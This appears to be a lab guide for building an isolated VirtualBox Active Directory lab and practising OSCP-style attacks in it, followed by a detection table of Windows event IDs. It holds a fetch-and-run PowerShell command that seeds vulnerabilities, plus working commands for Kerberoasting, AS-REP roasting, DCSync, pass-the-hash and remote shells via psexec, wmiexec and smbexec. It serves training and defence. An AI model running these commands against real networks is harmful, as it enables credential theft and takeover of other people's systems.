# Two-Host VirtualBox AD Lab (with Lateral Movement)

Extends the single-DC build into **DC + member + Kali** so you get the *full*
OSCP Active Directory chain — Kerberoasting, AS-REP, DCSync, **and** lateral
movement (DC → member) — all local, $0, on a 16 GB laptop.

> **Acronyms:** DC = Domain Controller · AD = Active Directory · SPN = Service
> Principal Name · NTLM = NT LAN Manager (the hash you pass) · PtH = Pass-the-Hash
> · RID = Relative Identifier.

## RAM budget (16 GB laptop)

Run the Windows VMs as **Server Core** (no desktop GUI) to save ~1.5 GB each.

| VM | Install type | RAM | vCPU |
|---|---|---|---|
| DC01 | Server 2022 **Desktop Experience** (GUI — easier to promote) | 3072 MB | 2 |
| MEMBER01 | Server 2022 **Server Core** (no GUI — lean) | 2048 MB | 2 |
| Kali | — | 2560 MB | 2 |

Leaves ~8 GB for your host. Close Chrome/Slack while you work. It'll be slow, not broken.

## Network

Put **all three** VMs on the **same VirtualBox Internal Network** (name it `adlab`).
Internal Network = isolated, no internet, no touching your home LAN — safe for a
deliberately vulnerable DC.

- DC01: `10.10.10.10/24`, DNS → itself (`127.0.0.1`)
- MEMBER01: `10.10.10.20/24`, DNS → `10.10.10.10` (must point at the DC to join)
- Kali: `10.10.10.50/24`, DNS → `10.10.10.10`

Set static IPs (no DHCP on an Internal Network unless you add one).

---

## Step 1 — Build DC01 (same as single-dc-lab.md)

Follow `single-dc-lab.md` through promoting DC01 to `lab.local` and running the
vulnerable-AD script. Summary:
```powershell
# On DC01, PowerShell as admin:
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName "lab.local" -InstallDNS -Force   # reboots
# after reboot, seed vulns:
IEX((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/WaterExecute/vulnerable-AD/master/vulnad.ps1"))
Invoke-VulnAD -UsersLimit 50 -DomainName "lab.local"
```

## Step 2 — Build MEMBER01 and join the domain

Create the VM (Server Core, 2 GB, Internal Network `adlab`). After install, at the
Core command prompt type `powershell`, then:

```powershell
# Static IP + point DNS at the DC (critical for domain join)
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 10.10.10.20 -PrefixLength 24
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.10.10.10

# Join the domain (prompts for lab.local admin creds)
Add-Computer -DomainName "lab.local" -Credential (Get-Credential) -Restart
```

After reboot, MEMBER01 is a domain member — your lateral-movement target.

> **Make the pivot realistic:** on DC01, add your soon-to-be-compromised domain
> account to MEMBER01's local Administrators (or push it via a GPO). Lateral
> movement works because a domain cred has admin rights on another host.

## Step 3 — Build Kali

VM on Internal Network `adlab`, static `10.10.10.50`, DNS `10.10.10.10`. Tools:
```bash
sudo apt update && sudo apt install -y python3-impacket netexec hashcat
```

---

## Step 4 — Attack DC01 (get your first creds)

```bash
export DC=10.10.10.10 DOMAIN=lab.local

# Kerberoasting: request service tickets, crack offline
impacket-GetUserSPNs $DOMAIN/lowpriv:'Password123' -dc-ip $DC -request -outputfile kerb.hash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt

# AS-REP roasting: users with pre-auth disabled
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC -format hashcat -outputfile asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# DCSync: pull hashes with replication rights
impacket-secretsdump $DOMAIN/dcsyncuser:'Password123'@$DC
```

## Step 5 — Lateral movement: pivot DC01 → MEMBER01

This is the part the single-DC lab can't do. Using creds/hashes looted above:

```bash
export MEMBER=10.10.10.20

# Validate the cred works on the member
nxc smb $MEMBER -u Administrator -p 'Password123'

# Pass-the-Hash (no plaintext needed — use the NTLM hash from secretsdump)
nxc smb $MEMBER -u Administrator -H <NTLM-hash>

# Get a shell on the member (several techniques — know all of them for OSCP):
impacket-psexec $DOMAIN/Administrator@$MEMBER -hashes :<NTLM-hash>   # SMB + service
impacket-wmiexec $DOMAIN/Administrator@$MEMBER -hashes :<NTLM-hash>  # WMI, quieter
impacket-smbexec $DOMAIN/Administrator@$MEMBER -hashes :<NTLM-hash>  # SMB, no disk write
```

You now have code execution on a *second* host using creds stolen from the first —
that's lateral movement.

---

## Purple-team: detect each step (your SOC goal)

On DC01, ship the Security log and watch for:

| Attack | Windows Event | What to flag |
|---|---|---|
| Kerberoasting | 4769 | TGS request with **RC4** (type 0x17) for an SPN account |
| AS-REP roasting | 4768 | TGT for an account with pre-auth not required |
| DCSync | 4662 | Replication GUID access from a **non-DC** account |
| PtH / lateral | 4624 (type 3) / 4776 | NTLM logon to MEMBER01 from an unexpected source |

See `../detections/README.md`. Build the detection *and* the attack — that's the
half that makes you stand out.

## Teardown / pause

VirtualBox: just **Save State** or power off the VMs when done — no billing, no
deallocate dance. Snapshot each VM *before* the vulnerable-AD script so you can
reset to a clean domain.
